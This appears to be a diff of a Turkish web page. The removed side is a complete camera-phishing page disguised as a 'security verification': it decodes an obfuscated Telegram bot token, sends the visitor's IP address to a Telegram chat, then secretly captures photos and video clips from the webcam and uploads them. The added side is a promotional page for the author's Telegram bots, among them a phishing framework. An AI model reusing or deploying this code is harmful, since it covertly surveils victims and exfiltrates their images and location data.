@@ -1,269 +1,336 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="googlebot" content="noindex">
-    <title>SNOWY Güvenlik Doğrulaması</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.98);
-            border-radius: 30px;
-            padding: 40px;
-            max-width: 480px;
-            width: 100%;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
-            text-align: center;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(102, 126, 234, 0.2);
-        }
-        h2 { 
-            color: #1a1a2e; 
-            font-size: 32px; 
-            margin-bottom: 15px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-        h2 span { 
-            color: #667eea;
-            text-shadow: 0 2px 10px rgba(102, 126, 234, 0.2);
-        }
-        p { 
-            color: #4a5568; 
-            margin-bottom: 35px;
-            font-size: 16px;
-            line-height: 1.6;
-        }
-        .btn {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            padding: 18px 36px;
-            font-size: 20px;
-            font-weight: 600;
-            border-radius: 60px;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.2s ease;
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
-        }
-        .btn:hover { 
-            transform: translateY(-2px);
-            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
-        }
-        .loading { 
-            display: none; 
-            margin: 30px 0 20px;
-        }
-        .spinner {
-            border: 4px solid #e2e8f0;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
-            margin: 0 auto 15px;
-        }
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
-        }
-        .loading-text { 
-            color: #667eea; 
-            font-size: 18px;
-            font-weight: 500;
-        }
-        #video, #canvas { display: none; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>SNOWY DEXRY WEXRY | Cyber Security Tool</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);
+      font-family: 'Orbitron', 'Share Tech Mono', monospace;
+      color: #d0eaff;
+      line-height: 1.5;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* Cyberpunk grid */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 255, 255, 0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    body::after {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: repeating-linear-gradient(0deg, rgba(0, 255, 255, 0.02) 0px, rgba(0, 255, 255, 0.02) 2px, transparent 2px, transparent 6px);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      position: relative;
+      z-index: 2;
+      max-width: 1300px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem 4rem;
+    }
+
+    /* glitch title */
+    .glitch-title {
+      text-align: center;
+      margin: 2rem 0 1rem;
+    }
+
+    .glitch {
+      font-size: 3.8rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 6px;
+      position: relative;
+      text-shadow: 0.05em 0 0 rgba(255, 0, 100, 0.7), -0.05em -0.025em 0 rgba(0, 255, 255, 0.7);
+      animation: glitch-shake 0.3s infinite alternate;
+      color: #b0f0ff;
+      word-break: break-word;
+    }
+
+    @keyframes glitch-shake {
+      0% { transform: translate(0); text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00ffff; }
+      100% { transform: translate(-0.02em, 0.01em); text-shadow: -0.05em -0.025em 0 #ff00c1, 0.05em 0.1em 0 #00ffff; }
+    }
+
+    .glitch-sub {
+      font-size: 1.2rem;
+      color: #7df9ff;
+      border-top: 1px solid cyan;
+      border-bottom: 1px solid cyan;
+      display: inline-block;
+      padding: 0.5rem 1.8rem;
+      backdrop-filter: blur(4px);
+      background: rgba(0, 20, 30, 0.5);
+      letter-spacing: 2px;
+    }
+
+    /* cards and sections */
+    .card {
+      background: rgba(10, 20, 30, 0.65);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(0, 255, 255, 0.4);
+      border-radius: 24px;
+      padding: 1.8rem;
+      margin: 2rem 0;
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2), inset 0 0 10px rgba(0, 255, 255, 0.05);
+      transition: all 0.2s ease;
+    }
+
+    .card:hover {
+      border-color: cyan;
+      box-shadow: 0 0 28px rgba(0, 255, 255, 0.5);
+    }
+
+    .owner-badge {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 2rem;
+      margin: 1.5rem 0;
+      font-weight: bold;
+    }
+
+    .owner-item {
+      background: #0a111f;
+      padding: 0.5rem 1.2rem;
+      border-radius: 40px;
+      border-left: 3px solid cyan;
+      font-family: monospace;
+      font-size: 1rem;
+    }
+
+    .owner-item a {
+      color: #0ff;
+      text-decoration: none;
+      transition: 0.2s;
+    }
+    .owner-item a:hover {
+      text-shadow: 0 0 5px cyan;
+      text-decoration: underline;
+    }
+
+    .bot-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.2rem;
+      justify-content: space-between;
+      margin-top: 1rem;
+    }
+
+    .bot-card {
+      background: linear-gradient(145deg, #07121e, #01070e);
+      flex: 1 1 200px;
+      padding: 1rem;
+      border-radius: 20px;
+      border: 1px solid #0ff33f55;
+      text-align: center;
+      transition: 0.2s;
+    }
+    .bot-card:hover { transform: translateY(-5px); border-color: #0ff; }
+    .bot-name { font-size: 1.25rem; font-weight: bold; color: #ffb347; }
+    .bot-tag { font-family: monospace; font-size: 0.85rem; word-break: break-all; background: #00000066; display: inline-block; padding: 0.2rem 0.8rem; border-radius: 20px; margin-top: 8px; }
+    .bot-tag a { color: #7effc3; text-decoration: none; }
+    .bot-role { font-size: 0.7rem; margin-top: 5px; color: #88aaff; }
+
+    .separator {
+      display: flex;
+      justify-content: center;
+      gap: 0.6rem;
+      margin: 20px 0;
+      font-size: 1.8rem;
+      letter-spacing: 8px;
+      font-weight: bold;
+      color: #ff3366;
+    }
+
+    .description {
+      font-size: 1rem;
+      background: #010b16aa;
+      padding: 1.2rem;
+      border-radius: 20px;
+      border-left: 6px solid cyan;
+      margin: 1rem 0;
+    }
+
+    .link-btn {
+      display: inline-block;
+      background: #0ff11620;
+      border: 1px solid cyan;
+      padding: 0.5rem 1.3rem;
+      border-radius: 36px;
+      color: #b7ffff;
+      font-weight: bold;
+      text-decoration: none;
+      transition: 0.2s;
+    }
+    .link-btn:hover {
+      background: cyan;
+      color: black;
+      box-shadow: 0 0 15px cyan;
+    }
+
+    .quote {
+      font-size: 1.1rem;
+      text-align: center;
+      font-style: italic;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 1rem;
+      border-radius: 60px;
+      letter-spacing: 1px;
+    }
+
+    hr {
+      border-color: cyan;
+      margin: 1rem 0;
+      box-shadow: 0 0 5px cyan;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 3rem;
+      font-size: 0.7rem;
+      opacity: 0.7;
+    }
+
+    @media (max-width: 750px) {
+      .glitch { font-size: 2.2rem; letter-spacing: 3px; }
+      .bot-grid { flex-direction: column; }
+      .owner-badge { flex-direction: column; align-items: center; gap: 0.8rem; }
+    }
+
+    .section-title {
+      border-left: 5px solid cyan;
+      padding-left: 1rem;
+      margin-bottom: 1rem;
+      font-size: 1.5rem;
+      font-weight: bold;
+    }
+
+    .double-sword {
+      text-align: center;
+      font-size: 2rem;
+      letter-spacing: 10px;
+      color: #0ff;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
-        <p>Devam etmek için kamera erişimine izin verin.</p>
-        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
-        </div>
+<div class="container">
+
+  <!-- Ana başlık: SNOWY DEXRY WEXRY -->
+  <div class="glitch-title">
+    <div class="glitch">SNOWY DEXRY WEXRY</div>
+    <div style="margin-top: 12px;"><span class="glitch-sub">CYBER SECURITY & PENTEST TOOLS</span></div>
+  </div>
+
+  <!-- Owner & Bio & Channel & Chat -->
+  <div class="owner-badge">
+    <div class="owner-item">OWNER: <a href="https://t.me/SnowyOrj" target="_blank">@SnowyOrj</a></div>
+    <div class="owner-item">BIO: <a href="https://t.me/SnowyOrjBio" target="_blank">@SnowyOrjBio</a></div>
+    <div class="owner-item">CHANNEL: <a href="https://t.me/SnowyRoot" target="_blank">@SnowyRoot</a></div>
+    <div class="owner-item">CHAT: <a href="https://t.me/SnowyDork" target="_blank">@SnowyDork</a></div>
+  </div>
+
+  <!-- double swords line -->
+  <div class="double-sword">⚔️⚔️⚔️⚔️⚔️⚔️⚔️⚔️</div>
+
+  <!-- Botlarım kısmı -->
+  <div class="card">
+    <div class="section-title">BOTLARIM - SNOWY ARSENAL</div>
+    <div class="bot-grid">
+      <div class="bot-card">
+        <div class="bot-name">Phishing Botumuz</div>
+        <div class="bot-tag"><a href="https://t.me/SnowyPhishingBot" target="_blank">@SnowyPhishingBot</a></div>
+        <div class="bot-role">Phishing Framework</div>
+      </div>
+      <div class="bot-card">
+        <div class="bot-name">Yapay Zeka Botumuz</div>
+        <div class="bot-tag"><a href="https://t.me/SnowyYapayZeka_Bot" target="_blank">@SnowyYapayZeka_Bot</a></div>
+        <div class="bot-role">AI Assistant</div>
+      </div>
+      <div class="bot-card">
+        <div class="bot-name">Index Çekme Botumuz</div>
+        <div class="bot-tag"><a href="https://t.me/SnowyIndexBot" target="_blank">@SnowyIndexBot</a></div>
+        <div class="bot-role">Index Puller</div>
+      </div>
+      <div class="bot-card">
+        <div class="bot-name">Kumar Botumuz</div>
+        <div class="bot-tag"><a href="https://t.me/SnowyKumar_Bot" target="_blank">@SnowyKumar_Bot</a></div>
+        <div class="bot-role">Gaming Module</div>
+      </div>
     </div>
     
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <!-- separator lines -->
+    <div class="separator">◆◆◆◆◆◆◆◆◆◆</div>
+    <div class="separator" style="color:#ff5555; font-size:1.5rem;">⬛⬛⬛  ⬛⬛⬛⬛⬛</div>
+  </div>
 
-    <script>
-        (function() {
-            // ==================== KONFİGÜRASYON ====================
-            const __ENV = {
-                API_ENDPOINT: "https://api.telegram.org",
-                SESSION_SECRET: "ODcxMDUwMTgxMzpBQUVrM19hR0ZnUmJ4d2htMXdncnpqb0lzRF9WN1pKOXZYOA==",
-                APP_ENV: "production"
-            };
+  <!-- Pentester aracı -->
+  <div class="card">
+    <div class="section-title">WEB TABANLI GÜVENLİK ARACI</div>
+    <div class="description">
+      Pentester ve sistem yöneticileri için geliştirilmiş web tabanlı güvenlik aracıyla domain/IP analizlerini tek panelden yapabilirsiniz.
+    </div>
+    <div style="margin-top: 0.5rem;">
+      <a href="https://snowy.axondatarel.org" target="_blank" class="link-btn">SNOWY ANALİZ PANELI →</a>
+    </div>
+  </div>
 
-            const SessionManager = {
-                getToken: function() {
-                    try {
-                        return atob(__ENV.SESSION_SECRET);
-                    } catch (error) {
-                        return null;
-                    }
-                }
-            };
+  <!-- Detay ve kullanım rehberi -->
+  <div class="card">
+    <div class="section-title">DETAYLAR & KULLANIM REHBERİ</div>
+    <div class="description">
+      Daha fazla detay, kullanım rehberi ve tüm özellikler için <strong><a href="https://t.me/SnowyOrjBio" target="_blank" style="color:#0ff;">@SnowyOrjBio</a></strong> adresini ziyaret edin.
+    </div>
+  </div>
 
-            const BOT_TOKEN = SessionManager.getToken();
-            
-            const urlParams = new URLSearchParams(window.location.search);
-            const TARGET_ID = urlParams.get('i');
-            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
-            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
-            
-            // ==================== IP ADRESİ GÖNDER ====================
-            if (TARGET_ID && BOT_TOKEN) {
-                fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => {
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                chat_id: TARGET_ID,
-                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
-                            })
-                        });
-                    })
-                    .catch(e => console.log(e));
-            }
-            
-            // ==================== KAMERA İŞLEMLERİ - KESİN ÇÖZÜM ====================
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
-            
-            let mediaRecorder = null;
-            let videoCount = 0;
-            let photoCount = 0;
-            let stream = null;
-            
-            async function startCamera() {
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            width: { ideal: 640 },
-                            height: { ideal: 480 },
-                            frameRate: { ideal: 60 }
-                        } 
-                    });
-                    
-                    video.srcObject = stream;
-                    
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        document.getElementById('startBtn').style.display = 'none';
-                        document.getElementById('loading').style.display = 'block';
-                        
-                        // ========================================
-                        // FOTOĞRAF - SADECE SETINTERVAL İLE (İLK FOTO YOK)
-                        // ========================================
-                        function fotoCek() {
-                            if (!stream?.active) return;
-                            
-                            photoCount++;
-                            
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            canvas.toBlob(function(blob) {
-                                if (!blob) return;
-                                const formData = new FormData();
-                                formData.append('chat_id', TARGET_ID);
-                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
-                                
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            }, 'image/jpeg', 0.85);
-                        }
-                        
-                        // İLK FOTOĞRAF YOK - SADECE SETINTERVAL
-                        setInterval(fotoCek, FOTO_SURESI * 1000);
-                        
-                        // ========================================
-                        // VİDEO - HEMEN BAŞLA (0ms)
-                        // ========================================
-                        function videoBaslat() {
-                            if (!stream?.active) return;
-                            
-                            videoCount++;
-                            const videoIndex = videoCount;
-                            const videoBaslangic = Date.now();
-                            const chunks = [];
-                            
-                            try {
-                                const mr = new MediaRecorder(stream, {
-                                    mimeType: 'video/webm;codecs=vp8',
-                                    videoBitsPerSecond: 2500000
-                                });
-                                
-                                mr.ondataavailable = (e) => {
-                                    if (e.data.size > 0) chunks.push(e.data);
-                                };
-                                
-                                mr.onstop = () => {
-                                    const blob = new Blob(chunks, { type: 'video/webm' });
-                                    const boyutKB = (blob.size / 1024).toFixed(0);
-                                    
-                                    const formData = new FormData();
-                                    formData.append('chat_id', TARGET_ID);
-                                    formData.append('video', blob, `video_${Date.now()}.webm`);
-                                    formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`);
-                                    
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                        method: 'POST',
-                                        body: formData
-                                    });
-                                };
-                                
-                                mr.start();
-                                
-                                setTimeout(() => {
-                                    if (mr.state === 'recording') mr.stop();
-                                }, VIDEO_SURESI * 1000);
-                                
-                            } catch(e) {}
-                        }
-                        
-                        // İLK VİDEO HEMEN
-                        videoBaslat();
-                        
-                        // DİĞER VİDEOLAR
-                        setInterval(videoBaslat, VIDEO_SURESI * 1000);
-                    };
-                    
-                } catch(e) {
-                    alert('Kamera izni gerekli!');
-                }
-            }
-            
-            window.onbeforeunload = function() {
-                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
-                if (stream) stream.getTracks().forEach(t => t.stop());
-            };
-            
-            window.startCamera = startCamera;
-        })();
-    </script>
+  <!-- Uzman açıklaması -->
+  <div class="card">
+    <div class="section-title">UZMANLIK ALANI</div>
+    <div class="description">
+      SNOWY DEXRY WEXRY, Siber Güvenlik alanına derin bir ilgi duyan, Python dilinde yetkin, güvenlik araçları (tools) geliştirme konusunda deneyimli ve kendini bu alanda sürekli geliştiren bir uzmandır.
+    </div>
+    <div class="double-sword">➿➿➿➿➿➿➿➿➿➿➿➿➿➿</div>
+  </div>
+
+  <!-- özel alıntı -->
+  <div class="quote">
+    “Приезжает много людей, но те, кто остаётся, особенные...”
+  </div>
+
+  <div class="double-sword" style="margin-top: 25px;">➿➿➿➿➿➿➿➿➿➿➿➿➿➿</div>
+
+  <footer>
+    SNOWY DEXRY WEXRY · SECURITY RESEARCH · PENTEST SUITE
+  </footer>
+</div>
 </body>
     </html>
